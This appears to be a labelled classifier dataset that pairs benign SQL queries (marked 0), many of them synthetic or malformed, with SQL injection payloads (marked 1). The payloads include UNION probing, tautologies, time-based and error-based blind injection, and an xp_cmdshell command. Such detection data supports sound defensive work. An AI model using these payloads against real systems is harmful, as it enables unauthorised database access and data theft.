1'   )    )    as nhkp where 8030  =  8030;1
"UPDATE employees SET quantity = 'john@example.com' WHERE description = 'john@example.com';";0
SELECT * FROM lift WHERE beginning = 'mission'  AND City = 'dig';0
select   (  case when   (  6434  =  3877  )   then 6434 else 1/  (  select 0  )   end  )  --;1
select   (  case when   (  9562  =  5996  )   then 1 else 9562*  (  select 9562 from master..sysdatabases  )   end  )  --;1
"UPDATE customers SET user_id = 'active' WHERE price = 'active';";0
SELECT AVG ( depend ) FROM women;0
select * from generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   limit 1--;1
"INSERT INTO inventory (user_id, quantity, created_at) VALUES ('john@example.com', 456, 'john@example.com');";0
"SELECT status, user_id, id, name FROM customers WHERE created_at = 123;";0
"1""  )   as evoq where 8193  =  8193 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --";1
"""a"""" or 3  =  3--""";1
SELECT * FROM various WHERE gold = 'local' FETCH FIRST 3 ROWS ONLY;0
SELECT COUNT ( DISTINCT purple )  FROM even;0
1   )    )     )   union all select null,null,null,null,null,null,null--;1
-6529'  )   or   (  4309  =  1601  )  *1601;1
"SELECT price, quantity FROM inventory WHERE id = 'john@example.com';";0
a' or 'a'   =   'a;1
"1"" union all select null,null,null,null,null#";1
SELECT * FROM young WHERE attention  BETWEEN 10 AND 20;0
1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --;1
SELECT correctly ( s FROM cow RIGHT JOIN;0
&';1
SELECT TOP 3 * FROM replied WHERE fill = 'ordinary';0
*  (  |  (  mail  =  *   )    ) ;1
DELETE FROM rush;0
-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#;1
1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #;1
"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea";1
waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf;1
"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """;1
SELECT test ( s )  FROM means LEFT JOIN;0
"1""   )    )    and make_set  (  1167  =  5027,5027  )   and    (    (   ""grfi""  =  ""grfi";1
1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- mtaq;1
SELECT COUNT ( DISTINCT breeze )  FROM mean;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15;1
or ''^';1
"1%""  )   order by 1#";1
"DELETE FROM orders WHERE name = 'pending';";0
" select * from users where id  =  1 or 1#""1 union select version  (    )  ,version  (    )   -- 1";1
1%' union all select null,null,null,null,null,null,null#;1
"DELETE FROM products WHERE quantity = 'Sample text';";0
"UPDATE orders SET created_at = 'active' WHERE status = 'user123';";0
SELECT COUNT ( these ) FROM lovely;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#;1
"SELECT email, created_at, name, status FROM logs WHERE description = 'active';";0
SELECT * FROM successful FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM capital;0
"-8053"" where 5458  =  5458 or 9323  =  9323#";1
1' where 8099  =  8099;1
select   (  case when   (  9931  =  3424  )   then 1 else 9931*  (  select 9931 from master..sysdatabases  )   end  )  --;1
1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'asdc' like 'asdc;1
"UPDATE sessions SET created_at = 'active' WHERE created_at = 'pending';";0
"INSERT INTO customers (id, created_at) VALUES ('john@example.com', 456);";0
select * from users where id  =  '1' *$ . or 1  =  1 -- 1';1
SELECT COUNT ( organized )  FROM moving;0
'-';1
-4191  )   order by 1#;1
-5137  )   or 9323  =  9323#;1
SELECT COUNT ( park ) FROM hang;0
-7346 or 8571  =  8571--;1
1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--;1
SELECT * FROM mass WHERE mental NOT LIKE '[mysterious]%';0
1%'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  ';1
"SELECT price, user_id, created_at FROM users WHERE name = 'pending';";0
"INSERT INTO users (status, description) VALUES (456, 'active');";0
1  )   where 2734  =  2734 waitfor delay '0:0:5'--;1
t'exec master..xp_cmdshell 'nslookup www.google.com'--;1
"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """;1
SELECT slip ( s FROM ago RIGHT JOIN;0
"UPDATE employees SET price = 'pending' WHERE price = 'Sample text';";0
"1%""   )    )    union all select null,null,null,null,null,null,null,null--";1
SELECT * FROM other;0
"1%""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --";1
SELECT COUNT ( DISTINCT breakfast )  FROM pleasant;0
HAVING 1=1--;1
SELECT front ( s )  FROM remove LEFT JOIN;0
SELECT * FROM five WHERE Price NOT BETWEEN 10 AND 20;0
SELECT AVG ( Price ) FROM basic;0
-1304'  )   union all select 7639#;1
1'+  (  select kfmv where 1679  =  1679;1
INSERT INTO high  ( straw, fire, spring )  VALUES  ( 'amount', 'tried', 'boy' )  ;0
1%'  )   and 4061  =  2730#;1
"INSERT INTO orders (id, quantity, status, name) VALUES ('2023-01-01', 'user123', 'active', 123);";0
select * from users where id  =  1 union select +!<1,version  (    )   -- 1;1
select * from generate_series  (  5206,5206,case when   (  5206  =  2214  )   then 1 else 0 end  )   limit 1--;1
-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --;1
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1";1
"1"" where 2204  =  2204 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --";1
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #;1
1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep;1
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ';1
"1%"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""%""  =  """;1
1   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   8554  =  8554;1
SELECT * FROM short WHERE    NOT want = 'twelve';0
"INSERT INTO logs (price, id, created_at, description) VALUES ('user123', 123, 456, 'john@example.com');";0
SELECT * FROM cut;0
"SELECT email FROM customers WHERE user_id = 456;";0
iif  (  2452  =  8999,1,1/0  )  ;1
1%' union all select null,null,null,null,null,null,null,null,null,null--;1
-4057'  )   order by 1#;1
ORDER BY 2#;1
SELECT COUNT ( sweet )  FROM thumb;0
WHERE 1=1 AND 1=1--;1
"-1588%""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #";1
SELECT * FROM planning WHERE NOT chicken = 'minerals'  AND NOT military = 'know';0
SELECT * FROM black WHERE paint NOT IN  ( 'visitor', 'swim', 'raise' )  ;0
1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ';1
select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #;1
1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""dsae""  =  ""dsae";1
"1""  )   where 4739  =  4739 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --";1
SELECT baseball FROM teacher UNION ALL SELECT yellow FROM does ORDER BY without;0
AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC);1
select   (  case when   (  2056  =  1917  )   then 2056 else 1/  (  select 0  )   end  )  --;1
"SELECT user_id, status FROM orders WHERE created_at = 'active';";0
1' ORDER BY 3--+;1
"1%""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'mmow'  =  'mmow;1
"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--";1
1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ;1
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1";1
"1%""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --";1
SELECT * FROM scene WHERE apple BETWEEN '1996-07-01' AND '1996-07-31';0
"DELETE FROM employees WHERE user_id = 'user123';";0
UPDATE whole SET life =  'man', City =  'key' WHERE recall =  valuable;0
"INSERT INTO orders (user_id, status) VALUES (123, 123);";0
"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """;1
SELECT dish ( s )  FROM jet;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--;1
"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--";1
"SELECT status, id FROM sessions WHERE id = 'active';";0
"1""   )    )    as osuh where 8809  =  8809";1
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
SELECT * FROM tears FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM softly;0
" select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1";1
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm";1
SELECT * FROM edge WHERE electric = 'flies'  OR saw = 'shaking';0
"DELETE FROM customers WHERE quantity = 'active';";0
"' AND MID(VERSION(),1,1) = '5';";1
SELECT * FROM spider WHERE observe IN  ( SELECT girl FROM everything ) ;0
1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn;1
select * from generate_series  (  4465,4465,case when   (  4465  =  6232  )   then 1 else 0 end  )   limit 1--;1
SELECT swing ( s )  FROM whatever UNION ALL;0
SELECT * FROM take WHERE country NOT BETWEEN 'deer' AND 'military';0
SELECT angryID AS ID, hurried AS across FROM copy;0
"1""   )    )     )   and 4124  =  7245 and    (    (     (  ""tuom""  =  ""tuom";1
1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk;1
SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard;0
1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --;1
1  )   and 4595  =  4595#;1
"UPDATE inventory SET price = 'Sample text' WHERE name = 'user123';";0
" select sleep  (  5  )   and ""cyrb""  =  ""cyrb";1
-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#;1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""%""  =  """;1
"UPDATE products SET status = 'pending' WHERE created_at = 123;";0
SELECT * FROM but WHERE plastic NOT LIKE '[market]%';0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#;1
-6190'   )    )     )   union all select 9413--;1
FROM  ( SELECT DISTINCT trunk FROM courage ) ;0
SELECT rabbit FROM plant UNION SELECT kids FROM stuck ORDER BY follow;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13;1
"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
"-5706""   )    )    union all select 2013,2013,2013,2013#";1
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'hcpo' like 'hcpo;1
"INSERT INTO employees (id, price, name, quantity) VALUES ('Sample text', 'active', 456, 'active');";0
"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#";1
SELECT AVG ( ate ) FROM wrapped SELECT SUM ( real ) ;0
"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --";1
1'   )    )    as dtwh where 9633  =  9633 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --;1
SELECT joy ( s )  FROM belt SELECT surrounded FROM driving;0
or 1  =  1 --;1
1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ;1
SELECT * FROM glass FETCH FIRST 3 ROWS ONLY;0
1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'lyem' like 'lyem;1
-4546'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ;1
SELECT COUNT ( struck )  FROM teach;0
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'ohqs' like 'ohqs;1
SELECT * FROM machine WHERE control BETWEEN '1996-07-01' AND '1996-07-31';0
-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
"UPDATE sessions SET user_id = 456 WHERE description = '2023-01-01';";0
SELECT * FROM stuck WHERE related = 'serious'  AND City = 'former';0
SELECT AVG ( happen ) FROM unusual;0
UNION ALL SELECT 1,2,3,4,5,6,7,8#;1
1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  ';1
"SELECT * FROM met WHERE entire BETWEEN ""tears"" AND    ""act""";0
select   (  case when   (  8993  =  8846  )   then 8993 else 8993*  (  select 8993 from mysql.db  )   end  )  #;1
"-3234%""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""%""  =  """;1
"SELECT id, name FROM customers WHERE status = 'Sample text';";0
,(select * from (select(sleep(10)))a);1
SELECT AVG ( sort ) FROM term SELECT SUM ( signal ) ;0
$  (  sleep 50  ) ;1
-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--;1
"SELECT quantity, status, description FROM customers WHERE quantity = 'Sample text';";0
1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'xdui' like 'xdui;1
#NAME?;1
SELECT COUNT ( DISTINCT cattle )  FROM coach;0
select * from users where id  =  1.*1 or 1  =  1 -- 1;1
"SLEEP(5)=""";1
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1";1
